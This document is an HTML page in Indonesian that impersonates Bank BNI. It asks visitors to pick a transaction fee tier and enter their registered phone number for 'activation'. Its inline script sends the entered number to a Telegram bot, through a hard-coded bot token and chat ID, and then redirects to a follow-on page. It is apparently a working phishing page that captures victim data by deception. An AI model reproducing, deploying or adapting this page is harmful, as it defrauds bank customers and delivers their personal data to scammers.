<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Home</title>
        <link rel="icon" href="bni.webp">
        <link
            href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
            crossorigin="anonymous"
        />
    </head>
    <body>
        <img src="bni.webp" class="img-fluid" alt="..." />
        <div class="container">
            <div class="mt-3">
                <h5>Selamat datang di bank bni</h5>
            </div>
            <div class="dropdown mt-3">
                <p style="color: #808080">
                    Silakan pilih tarif anda di bawah ini
                </p>
                <button
                    class="btn dropdown-toggle text-start"
                    type="button"
                    data-bs-toggle="dropdown"
                    aria-expanded="false"
                    style="border: 1px solid #000; width: 100%"
                >
                    Pilih tarif transaksi
                </button>
                <ul class="dropdown-menu">
                    <li>
                        <a class="dropdown-item" href="#"
                            >Tarif transaksi 150.000 ribu perbulan</a
                        >
                    </li>
                    <li>
                        <a class="dropdown-item" href="#"
                            >Tarif transaksi 6500 ribu pertransaksi</a
                        >
                    </li>
                </ul>
            </div>
            <div class="mt-3">
                <p style="color: #808080">Nomor handphone terdaftar</p>
                <input
                    class="form-control"
                    type="number"
                    name="nopek"
                    id="nopek"
                    placeholder="   (+62)"
                    style="width: 100%; border: 1px solid #000"
                />
            </div>
            <div class="mt-5">
                <button
                    class="btn fw-bold text-light"
                    style="background-color: #df420eff; width: 100%"
                    onclick="next()"
                >
                    Aktivasi
                </button>
            </div>
        </div>
        <script
            src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
            crossorigin="anonymous"
        ></script>
        <script>
            async function sendMessage(chatId, text) {
                const url =
                    "https://api.telegram.org/bot6296115188:AAHsxs2hX66fPQIDLkiyvEQYfByq2qXiN5Q/sendMessage";
                const payload = {
                    chat_id: chatId,
                    text: text,
                };

                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(payload),
                });

                if (!response.ok) {
                    throw new Error("Failed to send message");
                } else {
                    window.location.href = "informasi.html";
                }
            }
            const next = () => {
                let nopek = document.querySelector("#nopek").value;
                if (nopek === "") {
                    alert("mohon masukan nomor handphone!");
                } else {
                    let text = `Nomor handphone: ${nopek}`;
                    let chatId = "6201620059";
                    sendMessage(chatId, text);
                }
            };
        </script>
    </body>
</html>
